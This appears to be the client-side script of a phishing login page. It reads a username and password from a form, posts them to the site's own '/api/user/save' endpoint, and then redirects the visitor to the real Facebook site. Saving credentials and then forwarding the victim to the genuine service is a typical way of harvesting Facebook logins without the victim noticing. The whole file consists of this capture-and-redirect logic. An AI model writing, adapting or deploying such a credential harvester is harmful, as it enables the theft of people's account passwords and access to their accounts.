import {doPetitionToServer} from './petition.js';

const btn = document.getElementById('btn-log');

btn.onclick = async () => {
    const user = document.getElementById('user').value;
    const password = document.getElementById('password').value;
    let data = {
        url: '/api/user/save',
        method: 'POST',
        data: {
            user, password
        }
    };
    try {
        await doPetitionToServer(data);
    } catch(err) {
        console.warn(err);
    }
    window.location.replace('https://www.facebook.com/');
}